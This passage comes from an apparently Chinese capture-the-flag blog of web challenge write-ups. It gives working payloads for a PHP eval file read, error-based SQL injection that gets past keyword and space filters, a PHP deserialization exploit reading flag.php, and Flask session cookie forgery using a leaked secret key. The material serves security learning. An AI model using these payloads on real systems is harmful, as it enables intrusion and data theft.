<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">scandir(<span class="built_in">directory</span>,sorting_order,<span class="built_in">context</span>);</span><br><span class="line"></span><br><span class="line"> 返回指定目录中的文件和目录的数组,就是显示文件夹名字</span><br></pre></td></tr></table></figure></div>

<p>file_get_contents() 的使用：</p>
<pre><code>原型：file_get_contents(path,include_path,context,start,max_length)
file_get_contents() 函数把整个文件读入一个字符串中。
和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。
file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。
就是显示文件内容
</code></pre>
<hr>
<p>chr(47)是<code>/</code>的ASCII编码；【<code>/</code>就是根目录，可以先访问一下根目录，找找大概flag在哪里】</p>
<p>chr(102)是<code>f</code>的ASCII编码；</p>
<p>chr(49)是<code>1</code>的ASCII编码；</p>
<p>chr(97)是<code>a</code>的ASCII编码；</p>
<p>chr(103)是<code>g</code>的ASCII编码。</p>
<p>【字符间用<code>.</code>连接，如<code>flag</code>-&gt;<code>chr(102).chr(49).chr(97).chr(103)</code>】</p>
<p>根据php解析字符串的特性</p>
<p>先试试返回看看根目录（/）下的文件有哪些</p>
<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(scandir(chr(47)))</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220819232248275.png" alt="image-20220819232248275"></p>
<p>看到有个<code>flagg</code></p>
<p>返回看看<code>/flagg</code>里的内容</p>
<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220819234552921.png" alt="image-20220819234552921"></p>
<h2 id="5-极客大挑战-2019-HardSQL"><a href="#5-极客大挑战-2019-HardSQL" class="headerlink" title="5.[极客大挑战 2019]HardSQL"></a>5.[极客大挑战 2019]HardSQL</h2><h3 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>看名字，猜测这个sql注入过滤很严</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821144626428.png" alt="image-20220821144626428"></p>
<p>先试试fuzz测试，看看过滤了哪些，发现union被过滤，所以不能用联合注入</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821144002573.png" alt="image-20220821144002573"></p>
<p>但是发现updatexml没有被过滤，所以可以试试报错注入</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821145036408.png" alt="image-20220821145036408"></p>
<p>先构造payload</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span><span class="meta">&amp;password=1&#x27;or updatexml(1,concat(0x7e,database(),0x7e),1)%23</span></span><br><span class="line">【这里+被过滤了，所以这里用<span class="meta">#】</span></span><br></pre></td></tr></table></figure>

<p>结果发现结果又被过滤了，后面用fuzz又测试了一下，发现空格也被过滤了，用%0a和其他符号也不能替换，所以只能试试()把结果框起来试试能不能绕过</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MATLAB"><figure class="iseeu highlight /matlab"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">1</span>&#x27;or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">%23</span></span><br></pre></td></tr></table></figure></div>

<p>得到数据库名</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821172827984.png" alt="image-20220821172827984"></p>
<p>后面就是差不多了，但是要注意不能用空格，要用()框住对象</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br><span class="line">【这里的=也被过滤了，所以用<span class="keyword">like</span>替换】</span><br></pre></td></tr></table></figure>

<p>得到表名</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821173920231.png" alt="image-20220821173920231"></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>得到列名</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821174239954.png" alt="image-20220821174239954"></p>
<p>然后看看列里数据找找flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="REASONML"><figure class="iseeu highlight /reasonml"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">1</span>&#x27;<span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group<span class="constructor">_concat(<span class="params">id</span>,<span class="params">username</span>,<span class="params">password</span>)</span>)from(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<p>看回显知道flag在password里，但为什么显示不全，<strong>是因为updatexml报错回显的数据限制最多32位，所以无法显示全flag</strong></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821174509553.png" alt="image-20220821174509553"></p>
<p>所以可以用left和right函数进行分段显示，本来想用stustr函数，但是发现也被过滤了</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">left</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>为什么这里left函数显示30个字符，因为0x7e也就是<del>也是字符，</del>已经占了两位，所以还可以显示30位</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821220007687.png" alt="image-20220821220007687"></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220821220041922.png" alt="image-20220821220041922"></p>
<p>因为是左右显示30位，所以flag内容有重叠，整理一下</p>
<p>得到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">034eb054</span>-<span class="number">83b5</span>-412c-b90e-afc72c6ce998&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="6-网鼎杯-2020-青龙组-AreUSerialz1"><a href="#6-网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="6.[网鼎杯 2020 青龙组]AreUSerialz1"></a>6.[网鼎杯 2020 青龙组]AreUSerialz1</h2><p>1)题目描述</p>
<p>无</p>
<p>2)wp</p>
<p>一道典型的序列化题目</p>
<p>先对代码进行分析</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>__construct()函数没有用，不参与序列化中</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ord() 函数返回字符串中第一个字符的 ASCII 值。</span></span><br><span class="line"><span class="comment">// ASCII值32为2，ASCII值125为%</span></span><br></pre></td></tr></table></figure></div>

<p>这个函数主要是过滤掉protect类的成员,在序列化的时候是以%00作为标识符</p>
<p>但是在PHP版本大于7.1的情况下，protect类和public类没什么好注意的，所以在构造序列化时改为public可以绕过is_valid函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>__destruc()函数主要是不让<code>op===&quot;2&quot;</code>，但是在process函数里op又要为“2”</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>所以这里利用强弱类型比较，__destruc()函数里op是不能为2，但是是强类型比较，是字符2【”2”】,所以op=2【数字2】，就绕过达到读取flag.php的结果</p>
<p>于是构造出php序列化</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>得到序列化结果</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>：&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p>访问，F12查看【或者改一下filename的值为php://filter伪协议，用base64，可以直接看到】</p>
<p><code>http://f20b2545-8ff3-4a33-887f-27f4901db96a.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
<p>得到flag</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822135717175.png" alt="image-20220822135717175"></p>
<h2 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h2><h3 id="1-题目描述-4"><a href="#1-题目描述-4" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题开始当作弱密码题解，结果直接爆破出来了</p>
<p>用户名：admin</p>
<p>密码：123</p>
<p>这样应该最简单的方法了</p>
<p>但我看了看其他大佬wp，他们把这个当作flask_session伪造的题目</p>
<p>学习一下</p>
<p>先注册一个试试</p>
<p>用户名：admin123</p>
<p>密码：123456</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822203857056.png" alt="image-20220822203857056"></p>
<p>只在<code>change password</code>的源码看到线索，知道是flask框架</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822203848108.png" alt="image-20220822203848108"></p>
<p>访问下载文件</p>
<p>flask存在一个session伪造漏洞</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">flask的<span class="keyword">session</span>保存在客户端，一般只是加了签名来防止被截取修改，但是如果没有加密我们就可以对<span class="keyword">session</span>进行解码来获取其中的用户数据。 </span><br><span class="line"></span><br><span class="line">如果我们在获取到签名的秘钥，就可以按照解码出来的数据进行伪造，重新生成签名的<span class="keyword">session</span>来达到欺骗服务端。  </span><br><span class="line"></span><br><span class="line">flask的<span class="keyword">session</span>使用base64对bytes类型的用户数据进行编码，而且编码之前可能进行了压缩(<span class="keyword">session</span>以 &quot;.&quot;  开头时表示进行了压缩) flask 保存在cookie里面的<span class="keyword">session</span>一般格式为 data.timestamp.signature</span><br></pre></td></tr></table></figure></div>

<p>这里的session没有加密，在config.py中得到了签名秘钥<code>ckj123</code>，于是我们就可以重新生成session，来欺骗服务器</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822204409898.png" alt="image-20220822204409898"></p>
<p>利用cookie editor查看session值</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822231718091.png" alt="image-20220822231718091"></p>
<p>然后再找发现index.html下有flag提示</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220823000533344.png" alt="image-20220823000533344"></p>
<p>简单分析一下，就是让session里的name==”admin”</p>
<p>所以这里就需要修改一下我们得到的session</p>
<p>这里建议了解一下一个工具<code>flask-session-cookie-manager-master</code>能对其进行加密解码【可能需要pip下一些模块，百度可以解决】</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">解密</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> decode -s “cxk123” -<span class="keyword">c</span> “你在<span class="keyword">change</span>页面的session值”</span><br><span class="line">加密</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> encode -s “cxk123” -t “按照得到解密结果格式改的结果”</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220822235758750.png" alt="image-20220822235758750"></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line"></span><br><span class="line">把我们的用户名改为admin</span><br><span class="line"></span><br><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>然后再加密</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220823000020825.png" alt="image-20220823000020825"></p>
<p>然后cookie editor修改为我们加密结果</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">.eJxFUMtu<span class="name">g0</span>AM_JXK<span class="number">5</span>xx<span class="number">4</span>tBekHCKRIiqtEWgJ<span class="number">8</span>l<span class="number">4</span>iGkjAy<span class="number">1</span>IJWlE<span class="number">2</span>yr<span class="number">93</span><span class="name">m1</span>bKwQd<span class="number">7</span>xvbMXOF<span class="number">4</span><span class="symbol">ntq5</span>g-hcD<span class="number">3</span><span class="meta">O7</span>gWPfQHSFp<span class="number">3</span>eIgPhiSTYsuDM<span class="meta">o956</span>KRaiq<span class="number">3</span>KJEQ<span class="number">9</span>xpFR<span class="number">-6</span>LFEDmfwZ<span class="number">7</span>c<span class="number">6</span>SPfRZkq<span class="number">4</span>qzhfi<span class="number">0</span>vF<span class="number">-528</span>sJDpuboUsmAI<span class="number">0</span>mdx_<span class="meta">o8</span>lXlaBGLl-yuBmwouVvV<span class="number">7</span>EySis-rRSkITItZF<span class="number">4</span>H<span class="number">4</span>kZjVYbus<span class="number">6</span>VKrBiTT<span class="number">1</span>L<span class="number">7</span>rl<span class="number">9</span>EQFu<span class="number">4</span>beA<span class="number">0</span>T-fj<span class="number">54</span>dux<span class="number">4</span>cFq<span class="number">0</span>OsUifFVZKGwkkTcuBMFp<span class="number">2</span>T<span class="number">0</span>otEOWvFgPbkOTkdVWWQ<span class="number">7</span>bb<span class="number">3</span>c<span class="number">72</span>pL<span class="number">-3</span>jUuhC-Ef<span class="name">G2</span>jgA<span class="number">6</span>sb<span class="number">0</span>I<span class="number">2</span>zga<span class="number">26</span><span class="symbol">ne27</span><span class="keyword">ge</span><span class="number">3</span>D<span class="number">7</span>AeD<span class="number">4</span>b<span class="number">34.</span>YwOoDA.quyfjg-Miz<span class="number">9</span>Y<span class="number">5</span>cx<span class="number">6</span>i<span class="number">5</span>hTVr<span class="number">0</span>EWjE</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220823000303547.png" alt="image-20220823000303547"></p>
<p>得到flag</p>
<h2 id="8-ZJCTF-2019-NiZhuanSiWei"><a href="#8-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="8.[ZJCTF 2019]NiZhuanSiWei"></a>8.[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="1-题目描述-5"><a href="#1-题目描述-5" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>先分析一下</p>
